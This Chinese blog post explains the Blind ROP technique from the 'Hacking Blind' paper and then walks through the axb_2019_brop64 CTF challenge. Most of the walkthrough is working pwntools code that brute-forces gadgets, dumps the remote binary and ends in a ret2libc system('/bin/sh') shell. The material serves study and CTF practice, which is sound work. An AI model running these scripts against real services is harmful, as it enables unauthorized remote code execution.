---
title: BROP
date: 2023-07-17 10:44:41
tags: [Pwn,Stack,BROP]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROPcover.jpg"
categories: [Study]
---

BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下（在没有给出题目的情况下，只能通过尝试来确定），通过 ROP 进行远程攻击，劫持该应用程序的控制流，可用于开启了 ASLR、NX 和栈 canary 的 64-bit Linux。

# 一、基本原理

## 1.1 介绍

BROP [1] 即 Blind ROP，于2014年被提出。

[1]Bittau A, Belay A, Mashtizadeh A, et al. Hacking blind[C]//2014 IEEE Symposium on Security and Privacy. IEEE, 2014: 227-242.

**文章提出：**在不拥有目标二进制或源代码副本的情况下，针对崩溃后重新启动的服务，编写远程堆栈缓冲区溢出漏洞攻击是可能的。

许多服务器在崩溃后会重新启动其工作进程，以提高健壮性，包括Apache、nginx、Samba和OpenSSH，这就使得攻击者可以对其利用。BROP攻击假定服务器应用程序存在堆栈漏洞，并且在崩溃后重新启动。该攻击适用于启用了ASLR（地址空间布局随机化）、不可执行（NX）内存和堆栈Canary的现代64位Linux。作者提出，目前无法针对Windows系统，因为他们尚未将攻击适应Windows ABI。

**该攻击由两种新技术实现：**

- Generalized stack reading：通用的栈读取技术，即用于泄漏Canary的已知技术，泄漏保存的返回地址技术。用以在64位上绕过ASLR（地址随机化）。
- Blind ROP：这种技术可以远程定位ROP  gadgets。

这两种技术都有一个共同的想法，即使用单堆栈漏洞根据服务器进程是否崩溃来泄漏信息。堆栈读取技术使用可能的猜测值逐字节覆盖堆栈，直到找到正确的猜测值并且服务器没有崩溃，从而有效地读取（通过覆盖）堆栈。Blind ROP攻击远程来找到 gadgets 来执行写系统调用，之后服务器的二进制文件可以从内存传输到攻击者的套接字。在这一点上，Canary、ASLR和NX已经被解决，可以使用已知的技术进行攻击。

**BROP攻击能够在三种新情况下实现强大的通用攻击：**

1. 破解专有的封闭二进制服务。使用远程服务时可能会注意到崩溃，或者通过远程模糊测试发现崩溃。（专有封闭二进制服务：专有封闭二进制服务是指一种仅限于特定组织、团队或公司使用的二进制软件服务。这种服务通常是由私人公司或组织开发和维护的，并且没有公开的源代码或文档，因此只有授权用户才能使用和访问该服务。）
2. 破解一个开源库中的漏洞，该漏洞被认为用于专有的封闭二进制服务。例如，一个流行的SSL库可能存在堆栈漏洞，人们可能会猜测它正被专有服务使用。
3. 破解一个二进制文件未知的开源服务器。这适用于手动编译的安装或基于源代码的发行版，如Gentoo。

**文章的主要贡献如下：**

1. 提出了一种在服务器上绕过ASLR的技术（通用堆栈读取）。
2. 提出了一种远程查找ROP小工具（BROP）的技术，以便在二进制文件未知时对软件进行攻击。
3. 实现了一种工具——Braille，在给定如何在服务器上触发堆栈溢出的输入的情况下，自动构建漏洞。
4. 第一个针对nginx最近的漏洞的公开攻击，是通用的64位漏洞，它击败了ASLR、Canary 和 NX。
5. 给出了一些针对BROP攻击的防御建议。总之，ASLR必须应用于所有可执行段，并且必须在每次崩溃后重新随机化。

## 1.2 攻击原理

具体来说，BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下（在没有给出题目的情况下，只能通过尝试来确定），通过 ROP 进行远程攻击，劫持该应用程序的控制流。即假定存在栈漏洞，在无任何信息的情况下进行攻击。

在已知二进制文件的情况下，我们想要控制程序流程，通常先找到栈溢出漏洞，然后确定栈溢出字节，确定函数返回地址，然后通过gadgets来控制栈进而控制程序流程。参考[栈溢出基础知识+函数调用过程 ](https://wutong01304.github.io/2023/07/05/stack/) 。

那么没有二进制文件的情况下，我们需要解决的问题有：

- 栈溢出字节是多少？
- 怎么寻找 gadgets?
- 如果程序开启了ASLR、NX、Canary要怎么解决？

栈溢出字节可以通过暴力枚举来解决，第三个问题可以用其它常规方法，比如爆破canary、ret2libc l等来解决，因此BROP主要需要解决的问题就是，如何找到gadgets。

**攻击条件：**

- 程序必须存在溢出漏洞，以便攻击者可以控制程序流程。
- 进程崩溃以后可以重启（重启给暴力枚举创造了条件），而且重启之后的地址与先前的地址一样。（不一样的话，即便找到 gadgets 也不能用）

在BROP中，基本的遵循的**思路**如下

1. 判断栈溢出长度：从 1 开始暴力枚举，直到程序崩溃
2. Stack Reading：获取栈上的数据来泄露canary，以及ebp和返回地址。
3. Bind ROP：找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。
4. Build the exploit：利用输出函数来 dump 出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit。

------

# 二、攻击流程

## 2.1 Stack Reading

**Canary：**当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。在Linux中我们将cookie信息称为canary。

Canary在栈中的位置如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b1.png?x-oss-process=style/watermark)

即Canary在EBP的上面。Canary本身可以通过逐字节爆破来获取，如图所示：（正常Canary第一个字节为’\x00'，下图只是为了举例）

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b2.png?x-oss-process=style/watermark)

假设某个32位程序的Canary为 51 03 22 94，缓冲区为32字节，那么在输入28字节就会碰到 Canary，如果继续输入，就会覆盖Canary，程序会报错。如果我们输入的是 **'a'*28+'\x51**' 呢 ？按照linux进栈的规则，'\x51’ 会把 Canary的第一位覆盖，覆盖之后Canary并没有发生变化，也就不会报错了。

这也就是爆破Canaty的原理，每个字节有 0x00~0xff 种可能，也就是256种，只要我们从1试到256，就一定能知道最后一个字节的Canary是多少。当我们知道输入到**'a'*28+'\x51' **时，下一次输入就不会再报错，然后我们就可以尝试下一个字节，输入**'a'*28+'\x94'+’0~255‘**

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b3.png?x-oss-process=style/watermark)

当我们尝试到03时，程序就不会报错了，前两个字节的Canary就被爆破了。所以我们只要逐字节爆破，在32位中，需要爆破四个字节的Canary，只要尝试4×256=1024次就一定可以爆破Canary，64位8个字节，只需要尝试 8×256=2048 次就一定可以爆破Canary。爆破Canary不是本文的关键，因此爆破Canary的例题，将在下一篇文章[花式栈溢出技巧](https://wutong01304.github.io/2023/07/19/tricks/)介绍。

## 2.2 Bind ROP

找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。具体要做的就是：

- 找gadgets 
- 找 plt 表，比如 write、strcmp

### 2.2.1 找gadgets 和stop gadget

远程查找 gadgets 的基本思想是：覆盖保存的返回地址并检查程序行为来扫描应用程序的文本段。具体是利用填入不同的已知地址顺序来知道所猜的地址是否为可用gadget。一般来说，在返回地址填入一个地址时，会发生两件事：程序将崩溃或挂起，然后连接将关闭或保持打开。大多数时候，程序会崩溃，但当它没有崩溃时，就表示这是一个gadgets。

但是，即便我们找到gadgets，程序没有崩溃，后续也会因为改变了栈结构而发生崩溃，那么我们如何知道程序崩溃是因为什么导致的？如何知道返回地址填入gadgets后程序没有崩溃呢？因此论文提出了一个 stop gadget的概念，能够使程序正常返回的地址。

如图所示（图片截取于论文Hacking blind）：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b4.png)

程序在找到一个gadgets后，转去 stop gadget 执行。程序陷入循环，使攻击者一直保持连接状态，也就是其告诉攻击者，其所测试的地址是一段gadget。也就是说有了stop gadget，那些原本会导致程序崩溃的地址还是一样会导致崩溃，但那些正常返回的地址则会通过 stop gadget 进入被挂起的状态。stop gadget 地址一般为 main 或者 _start。

作者将gadgets分为3类：

- **Probe：**探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试。
- **Stop：**不会使得程序崩溃的stop gadget的地址。
- **Trap：**可以导致程序崩溃的地址，直接写 p64(0) 就可以

**probe,stop,traps ( trap, trap,...)：**我们可以通过这样的布局找到不对栈操作的gadgets，如：

- ret; 
- xor, rax, rax; ret;

**probe,trap,stop,traps：**我们可以通过这样的布局找到只是弹出一个栈变量的 gadget。如

- pop rax; ret
- pop rdi; ret

**probe, trap, trap, trap, trap, trap, trap, stop, traps：**我们可以通过这样的布局来找到弹出 6 个栈变量的 gadget，也就是与 brop gadget 相似的 gadget。

如果可以连续 pop6 个且不崩溃，很有可能就是通用gadgets（详见[ret2csu](https://wutong01304.github.io/2023/07/11/ret2csu/)）。

根据之前的：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b14.png?x-oss-process=style/watermark)

我们可以发现，从找到的 brop_gadget 其中 pop r15;ret 对应的字节码为41 5f c3。后两字节码 5f c3 对应的汇编即为 pop rdi;ret。这是为什么呢？我们可以去查pop rdi, ret的汇编码，也就是5f c3（ret的汇编码是C3），因此我们可以利用pop r15;ret 的汇编码来实现pop rdi; ret的功能。pop rdi；ret 的地址就是gadget + 9。

<img src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b15.png?x-oss-process=style/watermark" style="zoom:100%;" />

### 2.2.2 找 plt 表

程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b5.png?x-oss-process=style/watermark)

对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。

找到plt表后，我们可以遍历plt中的表项，也可以利用函数的特性来寻找我们需要的函数。比如puts函数。我们根据brop gadget 偏移可以得到相应的gadgets（详见[ret2csu](https://wutong01304.github.io/2023/07/11/ret2csu/)。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF。所以我们可以根据这个来进行判断。

构造以下输入：

```python
payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
```

如果程序成功打印出来\x7fELF，就说明我们找到puts_plt的地址了。

此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。然后对其进行攻击。

------

# 三、例题

题目链接：https://buuoj.cn/challenges#axb_2019_brop64 。也可以去buuctf上找，题目名字：axb_2019_brop64

参考链接：https://blog.csdn.net/mcmuyanga/article/details/112904455

尽管buuctf给出了题目文件，但是这道题可以用BROP的方法做，所以可以不用下载。题目比较简单，并没有使用PIE和Canary。

## 3.1 判断栈溢出长度

首先链接一下靶机，看一下程序：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b6.png?x-oss-process=style/watermark)

程序会将输入的内容打印一遍，然后退出。

输入300个字符，发现存在栈溢出漏洞：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b9.png?x-oss-process=style/watermark)

然后输入`%p、%s、%x`等格式化控制字符，看一下有没有格式化字符串漏洞（在后续的文章中[格式化字符串漏洞](https://wutong01304.github.io/2023/07/23/fmtstr/)介绍）。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b7.png?x-oss-process=style/watermark)

没有发现格式化字符串漏洞。

程序没有溢出时会输出Goodbye，因此我们可以从这里判断溢出长度：

```python
from pwn import *

def Force_find_padding():
    padding_length=0 #长度初始为0
    while True:
        try:
            padding_length=padding_length+1 #每次尝试加1
            sh = remote('node4.buuoj.cn', 29457) #链接远程
            sh.recvuntil("Please tell me:")
            sh.send('A' * padding_length) 
            if "Goodbye!" not in sh.recvall(): #如果最后输出的内容里面没有Goodbye，程序就溢出
                raise "Programe not exit normally!"
            sh.close() #断开链接
        except:
            log.success("The true padding length is "+str(padding_length-1)) #减一就是栈的长度
            return padding_length
    log.error("We don't find true padding length!")

padding_length=Force_find_padding()
```

得到**栈溢出长度216**：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b8.png?x-oss-process=style/watermark)

## 3.2  **寻找stop gadget**

此处我们希望我们能够爆破出main函数的首地址，进而直接让程序回到main函数进行执行。

首先此处我们可以先泄露原来的返回地址，得到基址，进而缩小爆破范围。(也可以不用，一般都是0x400000)

```python
from pwn import *
sh = remote('node4.buuoj.cn', 29457)
padding_length=216 #将栈填满
sh.recvuntil("Please tell me:")
sh.send('A' * padding_length)#程序在读取时自动加上了'\x00',
sh.recvuntil('A' * padding_length)
old_return_addr=u64(sh.recvuntil('Goodbye!').strip('Goodbye!').ljust(8,'\x00'))#所以会多接收一个栈帧的内容。
log.info('The old return address is '+ hex(old_return_addr))
```

事实上，如果程序在读取时并没有多加一个字符，是无法打印返回地址的。在这里，可以打印，说明程序多读取了一个字节\x00。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b10.png?x-oss-process=style/watermark)

得到程序的基址0x400000。

然后爆破main地址：

```python
from pwn import *

def Find_stop_gadget(old_return_addr,padding_length):
    maybe_low_byte=0x0000 #对后四个字节进行遍历,节省时间，可以直接从0x0700开始
    while True:
        try:
            sh = remote('node4.buuoj.cn', 25763)
            sh.recvuntil("Please tell me:")
            sh.send('A' * padding_length + p16(maybe_low_byte)) #覆盖返回地址后四个字节
            if maybe_low_byte > 0xFFFF: #遍历完还没有成功，说明基址有问题
                log.error("All low byte is wrong!")
            if "Hello" in sh.recvall(timeout=1): #如果hello再次出现，说明返回到了main函数
                log.success("We found a stop gadget is " + hex(old_return_addr+maybe_low_byte))
                return (old_return_addr+padding_length)
            maybe_low_byte=maybe_low_byte+1
        except:
            pass
            sh.close() 
            
stop_gadget=Find_stop_gadget(0x400000,216)
```

这个过程有点长，可能要多等一会儿。中间靶机挂掉了一次，然后重新开了一个靶机，不影响后续。爆破结果：**0x4007d6**

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b11.png?x-oss-process=style/watermark)

## 3.3 寻找BROP gadget

正如我们在原理中所说的，如果找到连续pop 6个的gadget，那么就是通用的gadgets。

```python
from pwn import *

def get_brop_gadget(length, stop_gadget):
	addr=0x400000 #节省时间，可以直接从0x400900开始
	while True:
		try:
			sh = remote('node4.buuoj.cn', 25763)
			sh.recvuntil('me:')
			payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10 #连续pop6个程序不崩溃
			sh.sendline(payload)
			if 'Hello' in sh.recvall(timeout=1):
				log.success("We found a brop gadget is " + hex(addr))
				return hex(addr)
			addr+=1
		except Exception:
			pass
			sh.close()

brop_gadget=get_brop_gadget(216,0x4007d6)
```

得到结果：**0x40095a**

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b12.png?x-oss-process=style/watermark)

## 3.4 **寻找puts@plt**

0x400000程序头的位置，前四个字符为 \x7fELF。因此可以使用0x400000的地址进行测试，如果程序成功打印出来\x7fELF，就说明我们找到puts_plt的地址了：

```python
from pwn import *
def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400000 #节省时间，可以直接从0x400600开始
    while 1:       
        try:
        	sh = remote('node4.buuoj.cn', 25763)
        	sh.recvuntil('me:')
        	payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget) #打印addr的内容
        	sh.sendline(payload)
		if "ELF" in sh.recvall(timeout=1): #如果有ELF，那么成功找到plt
			log.success("We found puts addr is " + hex(addr))
			return hex(addr)
		addr+=1
        except:
	    pass
            sh.close()
puts_addr=get_puts_addr(216, 0x40095a+9, 0x4007d6)
```

得到puts_plt的地址：**0x400635**

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b13.png?x-oss-process=style/watermark)

## 3.5 **利用puts@plt，Dump源文件**



```python
from pwn import *
def Dump_file(func_plt,padding_length,stop_gadget,brop_gadget):
    process_old_had_received_length=0
    process_now_had_received_length=0
    file_content=""
    while True:
        try:
            sh = remote('node4.buuoj.cn', 25763)
            while True:
                sh.recvuntil("Please tell me:")
                payload  = 'A' * (padding_length - len('Begin_leak----->'))
                payload += 'Begin_leak----->'
                payload += p64(brop_gadget+9) # pop rdi;ret;
                payload += p64(0x400000+process_now_had_received_length)
                payload += p64(func_plt)
                payload += p64(stop_gadget)
                sh.send(payload) #payload就相当于 'a'*216 + pop_rdi + addr + puts_addr + main,打印addr里的内容,返回到main
                sh.recvuntil('Begin_leak----->')
                received_data = sh.recvuntil('\nHello')[3:-6]#需要去掉多读取的pop_rdi
                if len(received_data) == 0 :
                    file_content += '\x00'
                    process_now_had_received_length += 1
                else :
                    file_content += received_data
                    process_now_had_received_length += len(received_data)
        except:
            if process_now_had_received_length == process_old_had_received_length :
                log.info('We get ' + str(process_old_had_received_length) +' byte file!')
                with open('axb_2019_brop64_dump','wb') as fout:
                    fout.write(file_content)
                return
            process_old_had_received_length = process_now_had_received_length
            sh.close()
            pass

puts_addr=0x400635 #0x400640
padding_length=216
stop_gadget=0x4007d6
brop_gadget=0x40095a
Dump_file(puts_addr,padding_length,stop_gadget,brop_gadget)
```

dump下了4096字节：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b17.png?x-oss-process=style/watermark)

用IDA打开，选择下面的Binary file，以二进制文件打开。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b18.png?x-oss-process=style/watermark)

编辑 --> 段 --> 编辑程序基址：Edit --> Segments --> Rebase program --> value=0x400000

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b19.png?x-oss-process=style/watermark)

找到 puts 函数位置，也就是我们之前找到的0x400635，按键盘上的C键显示汇编代码：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b21.png?x-oss-process=style/watermark)

找到 puts_got 的地址：**0x601018**

## 3.6 溢出

最后按常规方法溢出就可以

```python
from pwn import *
from LibcSearcher import *

context.log_level="debug" #调试用
p=remote('node4.buuoj.cn', 25763)
main=0x4007d6
puts_plt=0x400640
puts_got=0x601018
pop_rdi=0x400963 #brop_gadget+9	

p.recvuntil('Please tell me:')
payload='a'*216+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)#泄露puts地址
p.sendline(payload)

puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\0'))
success('puts_addr:'+hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr-libc.dump('puts')
system=libc_base+libc.dump('system')
binsh=libc_base+libc.dump('str_bin_sh')

payload='a'*216+p64(pop_rdi)+p64(binsh)+p64(system)+p64(main)
p.sendline(payload)
p.interactive()

```

结果：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/BROP/b16.png?x-oss-process=style/watermark)
